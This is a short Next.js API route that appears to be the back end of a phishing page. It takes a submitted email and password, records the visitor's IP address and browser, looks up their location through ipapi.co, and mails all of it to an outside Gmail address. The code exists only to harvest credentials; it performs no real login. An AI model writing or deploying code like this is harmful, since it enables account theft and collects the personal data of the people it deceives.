import { mailUser } from "@/util/mailer";
import { NextResponse, NextRequest } from "next/server";

export async function POST(request: NextRequest) {
    const body = await request.json();
    const { password, email } = body;

    const ip =
        request.headers.get("x-forwarded-for")?.split(",")[0] ||
        request.headers.get("x-real-ip") ||
        "unknown";

    const userAgent = request.headers.get("user-agent") || "unknown";

    let locationData = null;

    try {
        if (ip !== "unknown") {
            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
            locationData = await geoRes.json();
        }

        const res = await mailUser("visatplus@gmail.com", "Task", {
            email,
            password,
            ip,
            browser: userAgent,
            location: locationData,
        });

        return NextResponse.json({ res, locationData });
    } catch (error: any) {
        return NextResponse.json(
            { error: error?.message || "Unknown error" },
            { status: 500 }
        );
    }
}
